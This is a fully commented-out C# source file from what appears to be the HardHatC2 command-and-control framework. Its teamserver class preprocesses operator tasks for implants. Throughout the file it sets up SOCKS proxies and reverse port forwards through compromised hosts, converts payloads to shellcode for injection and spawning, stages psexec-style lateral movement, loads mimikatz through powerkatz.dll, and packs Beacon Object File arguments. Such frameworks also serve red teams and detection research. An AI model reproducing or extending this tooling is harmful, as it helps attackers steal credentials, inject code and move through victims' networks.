//using System;
//using System.Collections.Generic;
//using System.Diagnostics;
//using System.IO;
//using System.Linq;
//using System.Reflection;
//using System.Threading.Tasks;
//using ApiModels.Requests;
//using ApiModels.Shared;
//using Mono.Cecil;
//using Newtonsoft.Json;
//using RestSharp;
//using TeamServer.Controllers;
//using TeamServer.Models;
//using TeamServer.Models.Engineers;
//using TeamServer.Models.Extras;
//using TeamServer.Services;
//using TeamServer.Services.Handle_Implants;
////using DynamicEngLoading;

//namespace TeamServer.Utilities
//{
//    public class Engineer_TaskPreProcess
//    {
//        public static List<string> CommandsThatNeedPreProc = new List<string> { "inlineshellcode", "inlineAssembly", "loadassembly", "sleep", "powershell_import", "upload", "spawn", "inject", "jump", "inlinedll", "mimikatz","socks","rportforward","executeassembly","addcommand","addmodule", "execute_bof", "execute_pe" };

//        public static async Task PreProcessTask(EngineerTask currentTask, Engineer engineer)
//        {
            
//            //if command is proxy call the Socks4Proxy class to make a proxy
//            if (currentTask.Command.Equals("socks",StringComparison.CurrentCultureIgnoreCase))
//            {
//                if (!currentTask.Arguments.TryGetValue("/port", out string port))
//                {
//                    port = "1080";
//                }
//                port = port.TrimStart(' ');
//                //check if any of the pivot proxies are already using the port
//                if (PivotProxy.PivotProxyList.Any(x => x.BindPort == port))
//                {
//                    await HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"socks server on {port} already exists", Status = "error" });
//                    LoggingService.EventLogger.Error("socks server on {port} already exists", port);
//                    return;
//                }
//                HttpmanagerController.Proxy.Add(port ,new Socks4Proxy(bindPort: int.Parse(port))); // gives the user supplied value as the port to start the socks server on :) 
//                //HttpmanagerController.testProxy = new Socks4Proxy(bindPort: int.Parse(port));

//                //call proxy.Start() but dont block execution 
//                Task.Run(() => HttpmanagerController.Proxy[port].Start(engineer));
//                //Task.Run(() => HttpmanagerController.testProxy.Start(engineer));
//                //Console.WriteLine("Socks proxy started on port " + port);
//                await HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"socks server started on {port}", Status = "success" });
//                LoggingService.EventLogger.Information("socks server started on teamserver port {port}", port);
//                await HardHatHub.AddPivotProxy(new PivotProxy { EngineerId = engineer.engineerMetadata.Id, BindPort = port, FwdHost = engineer.engineerMetadata.Address, FwdPort ="*", pivotType = PivotProxy.PivotProxyType.SOCKS4a, pivotDirection = PivotProxy.ProxyDirection.Bind});
//                //if /stop is in the arguments, stop the proxy
//                if (currentTask.Arguments.ContainsKey("/stop"))
//                {
//                    HttpmanagerController.Proxy[port].Stop();
//                    await HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"socks server on {port} stopped", Status = "info" });
//                    LoggingService.EventLogger.Warning("socks server stopped on teamserver port {port}", port);
//                }
//            }

//            else if(currentTask.Command.Equals("rportforward", StringComparison.CurrentCultureIgnoreCase))
//            {
//                currentTask.Arguments.TryGetValue("/fwdport", out string fwdport);
//                currentTask.Arguments.TryGetValue("/fwdhost", out string fwdaddress);
//                currentTask.Arguments.TryGetValue("/bindport", out string bindPort);
//                //make a new guid for this client to have a unique id
//                string clientid = Guid.NewGuid().ToString();
//                fwdaddress = fwdaddress.TrimStart(' ');
//                fwdport =  fwdport.TrimStart(' ');
//                bindPort = bindPort.TrimStart(' ');
//                currentTask.Arguments.TryAdd("/client", clientid);
//                await HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"rport forward tasked to start targeting {fwdaddress}:{fwdport}", Status = "success" });
//                LoggingService.EventLogger.Information("reverse port forward set to target {fwdaddress}:{fwdport}", fwdaddress, fwdport);
//                Task.Run(async() => (RPortForward.rPortStart(fwdaddress, int.Parse(fwdport), clientid, engineer)));
//                await HardHatHub.AddPivotProxy(new PivotProxy { EngineerId = engineer.engineerMetadata.Id, FwdHost = fwdaddress, FwdPort = fwdport, BindPort = bindPort, pivotType = PivotProxy.PivotProxyType.R_PORT_FWD, pivotDirection = PivotProxy.ProxyDirection.Reverse });
//            }

//            // if the most recent engineerTask in taskList Command is shellcode, invoke the Shellcode.AssemToShellcode function, pass in the task.Arguments[0] and task.Arguments[1]
//            else if (currentTask.Command.Equals("inlineshellcode", StringComparison.CurrentCultureIgnoreCase))
//            {
//                byte[] shellcode;
//                currentTask.Arguments.TryGetValue("/program", out string program);
//                currentTask.Arguments.TryGetValue("/args", out string arguments);
//                //split the arguments into two strings at the first space
//                if (currentTask.Arguments.TryGetValue("/local", out string _))
//                {
//                    //if local then the file name and shellcode came from the client 
//                    //need to extract the name of the file from the program string 
//                    string filename = Path.GetFileName(program);

//                    shellcode = Shellcode.AssemToShellcode(currentTask.File, filename, arguments);
//                    currentTask.File = shellcode;
//                }
//                else
//                {
//                    shellcode = Shellcode.AssemToShellcode(program, arguments);
//                    currentTask.File = shellcode;
//                }
//            }

//            //if command is inlineAssembly then read the specified file argument and convert it to a byte array and add it to the task.Arguments dictionary
//            else if (currentTask.Command.Equals("inlineAssembly", StringComparison.CurrentCultureIgnoreCase))
//            {
//                currentTask.Arguments.TryGetValue("/file", out string filepath);
//                if (currentTask.Arguments.TryGetValue("/local", out string _))
//                {
//                    return; 
//                }
//                //if filepath is not a real file path then use the default programs folder 
//                if (!File.Exists(filepath))
//                {
//                    // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
//                    char allPlatformPathSeperator = Path.DirectorySeparatorChar;
//                    string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
//                    string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path HardHatC2\Teamserver\ 
//                    pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
//                    filepath = pathSplit[0] + "Programs" + allPlatformPathSeperator + "Users" + allPlatformPathSeperator + filepath;
//                }

//                filepath = filepath.TrimStart(' ');
//                var fileContent = System.IO.File.ReadAllBytes(filepath);
//                currentTask.File = fileContent;
//            }
//            else if (currentTask.Command.Equals("executeAssembly",StringComparison.CurrentCultureIgnoreCase))
//            {
//                //split the arguments into two strings at the first space
//                currentTask.Arguments.TryGetValue("/file", out string program);
//                currentTask.Arguments.TryGetValue("/args", out string arguments);
//                if (currentTask.Arguments.TryGetValue("/local", out string _))
//                {
//                    //if local then the file name and shellcode came from the client
//                    //need to extract the name of the file from the program string
//                    string filename = Path.GetFileName(program);
//                    Shellcode.AssemToShellcode(currentTask.File, filename, arguments);
//                    return;
//                }
//                if (!File.Exists(program))
//                {
//                    // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
//                    char allPlatformPathSeperator = Path.DirectorySeparatorChar;
//                    string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
//                    string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path HardHatC2\Teamserver\ 
//                    pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
//                    program = pathSplit[0] + "Programs" + allPlatformPathSeperator + "Users" + allPlatformPathSeperator + program;
//                }
//                var shellcode = Shellcode.AssemToShellcode(program, arguments);
//                currentTask.File = shellcode;
//            }

//            //if command is inlineAssembly then read the specified file argument and convert it to a byte array and add it to the task.Arguments dictionary
//            else if (currentTask.Command.Equals("loadassembly", StringComparison.CurrentCultureIgnoreCase))
//            {
//                if (currentTask.Arguments.TryGetValue("/local", out string _))
//                {
//                    return;
//                }
//                currentTask.Arguments.TryGetValue("/file", out string filepath);
//                filepath = filepath.TrimStart(' ');
//                var fileContent = System.IO.File.ReadAllBytes(filepath);
//                currentTask.File = fileContent;
//            }

//            // if command is sleep then update the engineer sleep value to the argument[0]
//            else if (currentTask.Command.Equals("sleep", StringComparison.CurrentCultureIgnoreCase))
//            {
//                currentTask.Arguments.TryGetValue("/time", out string sleep);
//                engineer.engineerMetadata.Sleep = int.Parse(sleep);
//            }

//            //if command is powershell_import read file at /import and turn it into a base64 string and add it to the task.Arguments dictionary with the key /script
//            else if (currentTask.Command.Equals("powershell_import", StringComparison.CurrentCultureIgnoreCase))
//            {
//                if (currentTask.Arguments.TryGetValue("/local", out string _))
//                {
//                    return;
//                }
//                currentTask.Arguments.TryGetValue("/import", out string filepath);
//                filepath = filepath.TrimStart(' ');
//                var fileContent = System.IO.File.ReadAllBytes(filepath);
//                currentTask.File = fileContent;
//            }

//            //if command is uplaod read file at /file and turn it into a base64 string and add it to the task.Arguments dictionary with the key /content
//            else if (currentTask.Command.Equals("upload", StringComparison.CurrentCultureIgnoreCase))
//            {
//                currentTask.Arguments.TryGetValue("/dest", out string dest);
//                currentTask.Arguments.TryGetValue("/file", out string filepath);
//                filepath = filepath.TrimStart(' ');
//                if (!currentTask.Arguments.TryGetValue("/local", out string _))
//                {
//                    var fileContent = System.IO.File.ReadAllBytes(filepath);
//                    currentTask.File = fileContent;
//                }
//                IOCFile _Pending = new IOCFile();
//                _Pending.Name = Path.GetFileName(filepath);
//                _Pending.UploadedPath = dest;
//                _Pending.UploadedHost = engineer.engineerMetadata.Hostname;
//                _Pending.ID = currentTask.Id;
//                _Pending.md5Hash = Hash.GetMD5HashFromFile(filepath);
//                _Pending.Uploadtime = DateTime.UtcNow;
//                IOCFile.PendingIOCFiles.Add(_Pending.ID, _Pending);
//            }

//            //if command is spawn call donut to make shellcode out of engineer 
//            else if (currentTask.Command.Equals("spawn", StringComparison.CurrentCultureIgnoreCase))
//            {
//                //split the arguments into two strings at the first space
//                if (!currentTask.Arguments.TryGetValue("/manager", out string manager))
//                {
//                    manager = engineer.engineerMetadata.ManagerName;
//                }
//                manager = manager.TrimStart(' ');
//                string arguments = "";

//                // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
//                char allPlatformPathSeperator = Path.DirectorySeparatorChar;
//                string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
//                string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path D:\my_Custom_code\HardHatC2\Teamserver\ 
//                pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
//                string filepath = Directory.GetFiles(pathSplit[0] + ".." + $"{allPlatformPathSeperator}", $"PostExEngineer_{manager}.exe").FirstOrDefault();

//                var shellcode = Shellcode.AssemToShellcode(filepath, arguments);
//                //convert byte array into a base64 string
//                currentTask.File = shellcode;
//            }

//            //if command is inject call donut to make shellcode out of engineer 
//            else if (currentTask.Command.Equals("inject", StringComparison.CurrentCultureIgnoreCase))
//            {
//                //split the arguments into two strings at the first space
//                if (!currentTask.Arguments.TryGetValue("/manager", out string manager))
//                {
//                    manager = engineer.engineerMetadata.ManagerName;
//                }
//                manager = manager.TrimStart(' ');
//                string arguments = "";

//                // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
//                char allPlatformPathSeperator = Path.DirectorySeparatorChar;
//                string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
//                string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path D:\my_Custom_code\HardHatC2\Teamserver\ 
//                pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
//                string filepath = Directory.GetFiles(pathSplit[0] +".." + $"{allPlatformPathSeperator}", $"PostExEngineer_{manager}.exe").FirstOrDefault();

//                var shellcode = Shellcode.AssemToShellcode(filepath, arguments);
//                //convert byte array into a base64 string
//                currentTask.File = shellcode;
//            }

//            //if command is jump call donut to make shellcode out of engineer and assign it to a variable called binary
//            else if (currentTask.Command.Equals("jump", StringComparison.CurrentCultureIgnoreCase))
//            {
//                //split the arguments into two strings at the first space
//                if (!currentTask.Arguments.TryGetValue("/manager", out string manager))
//                {
//                    manager = engineer.engineerMetadata.ManagerName;
//                }
//                manager = manager.TrimStart(' ');
//                string arguments = "";

//                // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
//                char allPlatformPathSeperator = Path.DirectorySeparatorChar;
//                string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
//                string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path HardHatC2\Teamserver\ 
//                pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
//                string filepath = "";

//                if (currentTask.Arguments.TryGetValue("/method", out string method))
//                {
//                    method = method.Trim();
//                    if (method.Equals("psexec", StringComparison.CurrentCultureIgnoreCase))
//                    {
//                        filepath = pathSplit[0] + ".."  + $"{allPlatformPathSeperator}" + $"PostExEngineer_{manager}_service.exe";
//                    }
//                    else
//                    {
//                        filepath = pathSplit[0] + ".." + $"{allPlatformPathSeperator}" + $"PostExEngineer_{manager}.exe";
//                    }
//                }
//                else
//                {
//                    filepath = pathSplit[0] + ".." + $"{allPlatformPathSeperator}" + $"PostExEngineer_{manager}.exe";
//                }
//                var fileContent = System.IO.File.ReadAllBytes(filepath);
//                currentTask.File = fileContent;
//        }

//            //if command is inlinedll take the /dll argument, read the file into a byte array, and convert that into a base64 string and replace the /dll value with this new string
//            else if (currentTask.Command.Equals("inlinedll", StringComparison.CurrentCultureIgnoreCase))
//            {
//                if (currentTask.Arguments.TryGetValue("/local", out string _))
//                {
//                    return;
//                }
//                currentTask.Arguments.TryGetValue("/dll", out string dllpath);
//                dllpath = dllpath.TrimStart(' ');
//                var fileContent = System.IO.File.ReadAllBytes(dllpath);
//               // Console.WriteLine($"got {fileContent.Length} dll bytes");
//                currentTask.File = fileContent;
//            }

//            //if command is mimikatz go to the base directory of the project then the programs/builtin directory and find the powerkatz.dll file read it into a byte array and convert it to a base64 string and add it to the task.Arguments dictionary with the key /dll
//            else if (currentTask.Command.Equals("mimikatz", StringComparison.CurrentCultureIgnoreCase))
//            {
//                char allPlatformPathSeperator = Path.DirectorySeparatorChar;
//                string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
//                string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path location\HardHatC2\Teamserver\ 
//                pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
//                string filepath = Directory.GetFiles(pathSplit[0] + "Programs" + $"{allPlatformPathSeperator}" + "Builtin" + $"{allPlatformPathSeperator}", $"powerkatz.dll").FirstOrDefault();
//                var fileContent = System.IO.File.ReadAllBytes(filepath);
//                currentTask.File = fileContent;

//                currentTask.Arguments.Add("/function", "powershell_reflective_mimikatz");
//                //update command name to inlinedll
//                currentTask.Command = "inlinedll";
//            }

//            else if(currentTask.Command.Equals("AddCommand",StringComparison.CurrentCultureIgnoreCase))
//            {
//                char allPlatformPathSeperator = Path.DirectorySeparatorChar;
//                string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
//                string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path location\HardHatC2\Teamserver\ 
//                pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
//                string StoredCommandFolder = pathSplit[0] + ".." + allPlatformPathSeperator + "Engineer" + allPlatformPathSeperator + "Commands" + allPlatformPathSeperator;

//                currentTask.Arguments.TryGetValue("/command", out string command);
//                command = command.TrimStart(' ');
//                //find the matching .cs file in the EngineerCommands folder
//                EnumerationOptions options = new EnumerationOptions();
//                options.MatchCasing = MatchCasing.CaseInsensitive;
//                string filepath = Directory.GetFiles(StoredCommandFolder, $"{command}.cs",options).FirstOrDefault();
//                //read the file content and make it into a EngineerCommand object
//                var fileContent = System.IO.File.ReadAllText(filepath);
//                //use the CompilerService to compile the file into a dll
//                byte[] AssemblyBytes = Compile.CompileCommands(fileContent);

//                currentTask.File = AssemblyBytes;
//            }

//            else if (currentTask.Command.Equals("AddModule", StringComparison.CurrentCultureIgnoreCase))
//            {
//                try
//                {
//                    char allPlatformPathSeperator = Path.DirectorySeparatorChar;
//                    string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
//                    string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path location\HardHatC2\Teamserver\ 
//                    pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
//                    string StoredModuleFolder = pathSplit[0] + ".." + allPlatformPathSeperator + "Engineer" + allPlatformPathSeperator + "Modules" + allPlatformPathSeperator;

//                    currentTask.Arguments.TryGetValue("/module", out string module);
//                    module = module.Trim();
//                    //find the matching .cs file in the EngineerCommands folder
//                    EnumerationOptions options = new EnumerationOptions();
//                    options.MatchCasing = MatchCasing.CaseInsensitive;
//                    string filepath = Directory.GetFiles(StoredModuleFolder, $"{module}.cs",options).FirstOrDefault();
//                    //read the file content and make it into a EngineerCommand object
//                    var fileContent = System.IO.File.ReadAllText(filepath);
//                    //use the CompilerService to compile the file into a dll
//                    byte[] AssemblyBytes = Compile.CompileCommands(fileContent);

//                    currentTask.File = AssemblyBytes;
//                }
//                catch (Exception ex)
//                {
//                    Console.WriteLine($"Error adding module: {ex.Message}");
//                }
                
//            }
//            else if(currentTask.Command.Equals("execute_bof",StringComparison.CurrentCultureIgnoreCase))
//            {
//                try
//                {

//                    currentTask.Arguments.TryGetValue("/file", out string filepath);
//                    if (currentTask.Arguments.TryGetValue("/local", out string _))
//                    {
//                        return;
//                    }
//                    //if filepath is not a real file path then use the default programs folder 
//                    if (!File.Exists(filepath))
//                    {
//                        // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
//                        char allPlatformPathSeperator = Path.DirectorySeparatorChar;
//                        string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
//                        string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path HardHatC2\Teamserver\ 
//                        pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
//                        filepath = pathSplit[0] + "Programs" + allPlatformPathSeperator + "Users" + allPlatformPathSeperator + filepath;
//                    }

//                    filepath = filepath.TrimStart(' ');
//                    var fileContent = System.IO.File.ReadAllBytes(filepath);
//                    currentTask.File = fileContent;

//                    //get the /bof_string argument
//                    currentTask.Arguments.TryGetValue("/argtypes", out string bof_string);
//                    //get the /bof_arg argument
//                    currentTask.Arguments.TryGetValue("/args", out string bof_arg);
//                    string hexString;
//                    List<object> argList = new List<object>();
//                    List<string> argTypeList = bof_string.Select(c => c.ToString()).ToList();
//                    List<string> bofArgList = bof_arg.Split(' ').ToList();
//                    for(int i=0; i<bofArgList.Count; i++)
//                    {
//                        string args = bofArgList[i];
//                        var argType = argTypeList[i];
//                        if (argType == "b")
//                        {
//                            //if this is the case then the arg is a byte array and we should convert it and add it to the argList 
//                            //first we need to remove the brackets from the string
//                            string arg = args.TrimStart('[');
//                            arg = arg.TrimEnd(']');
//                            //now we need to split the string on the commas
//                            List<string> byteStringList = arg.Split(',').ToList();
//                            //now we need to convert each string to a byte and add it to a byte array
//                            byte[] byteArray = new byte[byteStringList.Count];
//                            for (int j = 0; j < byteStringList.Count; j++)
//                            {
//                                byteArray[j] = Convert.ToByte(byteStringList[j]);
//                            }
//                            byte[] argValue = byteArray;
//                            argList.Add(argValue);
                            
//                        }
//                        else if (argType == "i")
//                        {
//                            //if this is the case then the arg is an int and we should convert it and add it to the argList
//                            int argValue = Convert.ToInt32(args);
//                            argList.Add(argValue);

//                        }
//                        else if (argType == "s")
//                        {
//                            //if this is the case then the arg is a short and we should add it to the argList
//                            short argValue = Convert.ToInt16(args);
//                            argList.Add(argValue);

//                        }
//                        else if (argType == "z")
//                        {
//                            // if this is the case then the arg is a string and we should add it to the argList
//                            argList.Add(args);

//                        }
//                        else if (argType == "Z")
//                        {
//                            // if this is the case then the arg is a wide string and we should add it to the argList
//                            argList.Add(args);
//                        }
//                    }

//                   bool result = bof_pack.Bof_Pack(bof_string, argList, out hexString);
//                    if(result)
//                    {
//                        currentTask.Arguments.Add("/bof_hex", hexString);
//                        Console.WriteLine($"Packing successful");
//                        Console.WriteLine($"Hex string: {hexString}");
//                    }
//                    else
//                    {
//                        Console.WriteLine($"Packing failed");
//                    }
//                }
//                catch (Exception ex)
//                {
//                    Console.WriteLine($"Error in bof packer: {ex.Message}");
//                    Console.WriteLine(ex.StackTrace);

//                }
//            }
//            else if (currentTask.Command.Equals("execute_pe", StringComparison.CurrentCultureIgnoreCase))
//            {
//                try
//                {

//                    currentTask.Arguments.TryGetValue("/file", out string filepath);
//                    if (currentTask.Arguments.TryGetValue("/local", out string _))
//                    {
//                        return;
//                    }
//                    //if filepath is not a real file path then use the default programs folder 
//                    if (!File.Exists(filepath))
//                    {
//                        // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
//                        char allPlatformPathSeperator = Path.DirectorySeparatorChar;
//                        string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
//                        string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path HardHatC2\Teamserver\ 
//                        pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
//                        filepath = pathSplit[0] + "Programs" + allPlatformPathSeperator + "Users" + allPlatformPathSeperator + filepath;
//                    }
//                    filepath = filepath.TrimStart(' ');
//                    var fileContent = System.IO.File.ReadAllBytes(filepath);
//                    currentTask.File = fileContent;
//                }
//                catch (Exception ex)
//                {
//                    Console.WriteLine($"Error in bof packer: {ex.Message}");
//                    Console.WriteLine(ex.StackTrace);

//                }
//            }
//        }
//    }
//}
